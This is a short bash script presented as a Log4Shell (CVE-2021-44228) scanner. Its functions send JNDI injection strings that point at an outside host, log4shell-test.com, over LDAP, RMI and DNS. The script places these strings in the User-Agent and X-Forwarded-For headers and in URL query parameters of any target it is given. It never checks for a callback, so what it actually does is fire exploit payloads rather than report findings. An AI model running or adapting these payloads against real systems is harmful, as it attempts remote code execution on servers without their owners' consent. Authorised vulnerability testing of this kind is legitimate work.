#!/bin/bash

# Log4Shell (CVE-2021-44228) Scanner - Built from Scratch
CVE_ID="CVE-2021-44228"
DESCRIPTION="Apache Log4j Remote Code Execution (Log4Shell)"

# Source CVEHACK libraries if available
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
if [[ -f "$SCRIPT_DIR/../../lib/colors.sh" ]]; then
    source "$SCRIPT_DIR/../../lib/colors.sh"
else
    RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'; BLUE='\033[0;34m'; NC='\033[0m'
    print_info() { echo -e "${BLUE}[INFO]${NC} $1"; }
    print_success() { echo -e "${GREEN}[SUCCESS]${NC} $1"; }
    print_error() { echo -e "${RED}[ERROR]${NC} $1"; }
    print_warning() { echo -e "${YELLOW}[WARNING]${NC} $1"; }
fi

scan_log4shell() {
    local target="$1"
    
    if [[ -z "$target" ]]; then
        print_error "Usage: $0 <target>"
        exit 1
    fi
    
    print_info "Testing $target for Log4Shell (CVE-2021-44228)"
    
    # Test various Log4j injection points
    test_http_headers "$target"
    test_url_parameters "$target"
    
    print_info "Log4Shell scan completed"
}

test_http_headers() {
    local target="$1"
    print_info "Testing HTTP headers for Log4j injection..."
    
    local payloads=(
        '${jndi:ldap://log4shell-test.com/a}'
        '${jndi:rmi://log4shell-test.com/a}'
        '${jndi:dns://log4shell-test.com/a}'
    )
    
    for payload in "${payloads[@]}"; do
        if command -v curl &> /dev/null; then
            curl -s -H "User-Agent: $payload" -H "X-Forwarded-For: $payload" "$target" > /dev/null 2>&1
            print_info "Tested payload: ${payload:0:30}..."
        fi
    done
}

test_url_parameters() {
    local target="$1"
    print_info "Testing URL parameters for Log4j injection..."
    
    local payload='${jndi:ldap://log4shell-test.com/url}'
    local test_urls=(
        "/?q=$payload"
        "/?search=$payload"
        "/?user=$payload"
    )
    
    for url in "${test_urls[@]}"; do
        if command -v curl &> /dev/null; then
            curl -s "$target$url" > /dev/null 2>&1
            print_info "Tested URL: $url"
        fi
    done
}

# Main execution
if [[ "${BASH_SOURCE[0]}" == "${0}" ]]; then
    scan_log4shell "$1"
fi
